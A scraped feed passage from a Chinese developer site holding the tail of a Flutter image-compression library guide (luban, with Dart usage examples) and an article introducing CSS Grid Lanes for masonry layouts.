126KB</td><td align="left">1440×600, 123KB</td></tr><tr><td align="left"><strong>设计原稿</strong></td><td align="left">6000×6000, 6.90MB</td><td align="left">1440×1440, 263KB</td><td align="left">1440×1440, 279KB</td></tr></tbody></table>
<h2 data-id="heading-3">🔬 核心算法特性</h2>
<p>本库采用<strong>自适应统一图像压缩算法 (Adaptive Unified Image Compression)</strong>，通过原图的分辨率特征，动态应用差异化策略，实现画质与体积的最优平衡。</p>
<h3 data-id="heading-4">智能分辨率决策</h3>
<ul>
<li><strong>高清基准 (1440p)</strong>：默认以 1440px 作为短边基准，确保在现代 2K/4K 屏幕上的视觉清晰度</li>
<li><strong>全景墙策略</strong>：自动识别超大全景图（长边 &gt;10800px），锁定长边为 1440px，保留完整视野</li>
<li><strong>超大像素陷阱</strong>：对超过 4096万像素的超高像素图自动执行 1/4 降采样处理</li>
<li><strong>长图内存保护</strong>：针对超长截图建立 10.24MP 像素上限，通过等比缩放防止 OOM</li>
</ul>
<h3 data-id="heading-5">自适应比特率控制</h3>
<ul>
<li><strong>极小图 (&lt;0.5MP)</strong>：几乎不进行有损压缩，防止压缩伪影</li>
<li><strong>高频信息图 (0.5-1MP)</strong>：提高编码质量，补偿分辨率损失</li>
<li><strong>标准图片 (1-3MP)</strong>：应用平衡系数，对标主流社交软件体验</li>
<li><strong>超大图/长图 (&gt;3MP)</strong>：应用高压缩率，显著减少体积</li>
</ul>
<h3 data-id="heading-6">健壮性保障</h3>
<ul>
<li><strong>膨胀回退</strong>：压缩后体积大于原图时，自动透传原图，确保绝不"负优化"</li>
<li><strong>输入防御</strong>：妥善处理极端分辨率输入（0、负数、1px 等），防止崩溃</li>
</ul>
<h2 data-id="heading-7">📦 安装</h2>
<p>在 <code>pubspec.yaml</code> 文件中添加依赖：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">luban:</span> <span class="hljs-string">^2.0.1</span>
</code></pre>
<p>然后运行：</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<h2 data-id="heading-8">💻 使用</h2>
<h3 data-id="heading-9">压缩单张图片</h3>
<h4 data-id="heading-10">使用 File 对象</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> file = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(file);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩完成'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'原图大小: <span class="hljs-subst">${compressionResult.originalSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩后大小: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩率: <span class="hljs-subst">${(compressionResult.compressionRatio * <span class="hljs-number">100</span>).toStringAsFixed(<span class="hljs-number">1</span>)}</span>%'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'输出文件: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩失败: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-11">使用字符串路径</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressPath(<span class="hljs-string">'/path/to/image.jpg'</span>);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩失败: <span class="hljs-subst">$error</span>'</span>),
    (compressionResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩完成，大小: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'输出文件: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    },
  );
}
</code></pre>
<h4 data-id="heading-12">指定输出文件</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> outputFile = File(<span class="hljs-string">'/path/to/output/compressed.jpg'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressToFile(inputFile, outputFile);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩完成，文件已保存到: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">指定输出目录</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(inputFile, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩完成，文件已保存到: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
<h3 data-id="heading-14">批量压缩图片</h3>
<p>批量压缩返回 <code>Result&lt;BatchCompressionResult&gt;</code>，需要先检查成功或失败状态，然后访问 <code>BatchCompressionResult</code> 获取所有图片的压缩结果。</p>
<h4 data-id="heading-15">使用文件列表</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image3.jpg'</span>),
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩完成'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'总数: <span class="hljs-subst">${batchResult.total}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'成功: <span class="hljs-subst">${batchResult.successCount}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'失败: <span class="hljs-subst">${batchResult.failureCount}</span>'</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> item <span class="hljs-keyword">in</span> batchResult.items) {
      <span class="hljs-keyword">if</span> (item.isSuccess) {
        <span class="hljs-keyword">final</span> compressionResult = item.result.value;
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: 压缩失败 - <span class="hljs-subst">${item.result.error}</span>'</span>);
      }
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩失败: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-16">使用路径列表</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> paths = [
    <span class="hljs-string">'/path/to/image1.jpg'</span>,
    <span class="hljs-string">'/path/to/image2.jpg'</span>,
    <span class="hljs-string">'/path/to/image3.jpg'</span>,
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatchPaths(paths);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩失败: <span class="hljs-subst">$error</span>'</span>),
    (batchResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩完成，成功 <span class="hljs-subst">${batchResult.successCount}</span>/<span class="hljs-subst">${batchResult.total}</span> 张'</span>);
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${compressionResult.file.path}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      }
    },
  );
}
</code></pre>
<h4 data-id="heading-17">批量压缩并指定输出目录</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
  ];
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩完成，成功 <span class="hljs-subst">${batchResult.successCount}</span> 张'</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'压缩文件: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'批量压缩失败: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS 新特性！瀑布流布局的终极解决方案]]></title>    <link>https://juejin.cn/post/7592805973120401414</link>    <guid>https://juejin.cn/post/7592805973120401414</guid>    <pubDate>2026-01-08T09:11:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120401414" data-draft-id="7592555965792141318" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS 新特性！瀑布流布局的终极解决方案"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-08T09:11:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS 新特性！瀑布流布局的终极解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:11:12.000Z" title="Thu Jan 08 2026 09:11:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>前端开发一直有一个老大难的问题，那就是——瀑布流布局。</p>
<p>效果需求并不复杂：卡片错落，参差有致，看起来高级，滚动起来流畅。</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb461618ba048129a3671b86e837821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=2SRdg%2BBxLzjywu%2BafHIsBcimrBo%3D" alt="" loading="lazy"/></p>
<p>就是这样一个看似简单的效果，其实已经困扰了前端开发者好多年。</p>
<p>要引入 JavaScript 库，要让内容智能填充，要实现响应式布局，写无数个媒体查询，要实现无限滚动加载，要用 JavaScript 处理复杂的布局逻辑……</p>
<p>现在，经过 Mozilla、苹果 WebKit 团队、CSS 工作组和所有浏览器的多轮讨论，它终于有了终极解决方案！</p>
<p>这就是 <strong>CSS Grid Lanes</strong>。</p>
<p>且让我们先翻译它为“CSS 网格车道”吧。</p>
<p>之所以叫车道，想象一下高速公路：有好几条车道，车辆会自动选择最短的那条车道排队。</p>
<p>CSS Grid Lanes 就是这个原理——你先定义好有几条“车道”（列），网页内容会自动填充到最短的那一列，就像车辆自动选择最不拥堵的车道一样。</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70e233f775d7494e97683ef53e2c76a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=%2Fy1sj6MSxm8u7jN5GAb6JeFfJGw%3D" alt="" loading="lazy"/></p>
<p>具体使用起来也很简单，三行代码就能实现：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<h2 data-id="heading-1">实现原理</h2>
<p>现在，让我们来细致讲解下如何实现开头图中的瀑布流效果。</p>
<p>首先是 HTML 代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-1.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-2.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-3.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- etc --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
</code></pre>
<p>然后是 CSS 代码：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<p>代码一共 3 行。</p>
<p><code>display: grid-lanes</code> 创建网格容器，使用瀑布流布局。</p>
<p><code>grid-template-columns</code> 创建车道，我们将值设为 <code>repeat(auto-fill, minmax(250px, 1fr))</code>，<strong>意思是至少 250 像素宽的灵活列。浏览器决定创建多少列，并填充所有可用空间。</strong></p>
<p><code>gap: 16px</code>表示车道之间有 16px 的间歇。</p>
<p>就是这么简单。</p>
<p><strong>3 行 CSS 代码，无需任何媒体查询或容器查询，我们就创建了一个适用于所有屏幕尺寸的灵活布局。</strong></p>
<hr/>
<p>更绝的是，这种布局能让用户通过 Tab 键在各个栏目之间切换，访问所有当前可见的内容（而不是像以前那样，先滚动到第一列底部，然后再返回第二列顶部）。</p>
<p>它也支持你实现无限循环加载，随着用户滚动页面，内容无限加载，而无需使用 JavaScript 来处理布局。</p>
<h2 data-id="heading-2">功能强大</h2>
<h3 data-id="heading-3">不同车道尺寸</h3>
<p>Grid Lanes 充分利用了 CSS Grid 的强大功能 <code>grid-template-*</code>来定义车道，所以很容易创建出富有创意的布局。</p>
<p>例如，我们可以创建一个布局，其中窄列和宽列交替出现——即使列数随视口大小而变化，第一列和最后一列也始终是窄列。</p>
<p>实现也很简单：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">16rem</span>, <span class="hljs-number">2</span>fr)) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr);
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e43e4b7a0c2542d8b72e051b7d03b610~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=Hiz5pxxyzUR8shGz%2B2RsEFv8e6k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">跨车道</h3>
<p>由于我们拥有网格布局的全部功能，我们当然也可以跨越车道。</p>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ddaa092544490eaed6ac584bafd1ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=fbRtAt2XS%2FPCCyJKxciCTkxIoQs%3D" alt="" loading="lazy"/></p>
<p>实现代码：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">20ch</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">2</span>lh;
}
<span class="hljs-selector-tag">article</span> {
  <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">1</span>;
}
<span class="hljs-keyword">@media</span> (<span class="hljs-number">1250px</span> &lt; <span class="hljs-attribute">width</span>) {
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">4</span>;
  }
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">4</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">5</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">6</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">7</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">8</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">2</span>;
  }
}
</code></pre>
<h3 data-id="heading-5">放置项目</h3>
<p>我们也可以在使用网格车道时显式地放置项目。这时，无论有多少列，标题始终位于最后一列。</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0c285c55e548109ef576fb38505b25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=WMczSVgEgOXgBErcyNPJlP9HkHU%3D" alt="" loading="lazy"/></p>
<p>实现代码为：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">24ch</span>, <span class="hljs-number">1</span>fr));
}
<span class="hljs-selector-tag">header</span> {
  <span class="hljs-attribute">grid-column</span>: -<span class="hljs-number">3</span> / -<span class="hljs-number">1</span>;
}
</code></pre>
<h2 data-id="heading-6">改变方向</h2>
<p>网格车道也可以双向排列！</p>
<p>上面的所有示例创建的是“瀑布式”布局，内容以列的形式排列。</p>
<p>网格车道也可以用于创建另一种方向的布局，即“砖块式”布局。</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd785169146a4b079c80b39ff00bf19f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=p%2FldkbgecAKVqifupFMkn9te9WI%3D" alt="" loading="lazy"/></p>
<p>当使用 <code>grid-template-columns</code>定义列时，浏览器会自动创建瀑布式布局，如下所示：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
